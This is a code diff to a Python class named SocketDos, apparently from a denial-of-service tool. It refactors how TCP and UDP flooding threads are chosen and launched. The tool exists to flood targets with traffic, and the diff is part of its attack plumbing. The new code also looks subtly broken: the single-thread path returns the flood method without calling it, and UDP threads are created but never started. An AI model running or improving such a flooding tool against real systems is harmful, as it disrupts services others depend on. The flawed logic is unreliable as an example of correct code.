@@ -22,7 +22,10 @@ class SocketDos():
     def get_socket_type(self, protocol):
         if protocol == 'tcp':
             return TCP
-        return UDP
+        elif protocol == 'udp':
+            return UDP
+        else:
+            raise ValueError(f"Unsupported protocol: {protocol}")
 
     def tcp_flood(self):
         try:
@@ -57,24 +60,23 @@ class SocketDos():
         Manage threads and choose attack method
         """
         try:
-            for _ in range(self.threads):
-                if self.protocol != False:
+            if not self.protocol or self.protocol not in (TCP, UDP):
+                raise ValueError(f"Unsupported protocol: {self.protocol}")
+            
+            if self.monothread:
+                if self.protocol == TCP:
+                    return self.tcp_flood
+                elif self.protocol == UDP:
+                    return self.udp_flood
+                
+            else:
+                for _ in range(self.threads):
                     if self.protocol == UDP:
-                        if self.monothread:
-                            return self.udp_flood()
-
                         thread = Thread(target=self.udp_flood)
-                        return thread.start()
-
+                        
                     if self.protocol == TCP:
-                        if self.monothread:
-                            return self.tcp_flood()
-
                         thread = Thread(target=self.tcp_flood)
-                        return thread.start()
-                else:
-                    print('Bad method')
-                    return
+                        thread.start()
 
         except Exception as e:
             color_text('red', f'[!] Error: {e}')
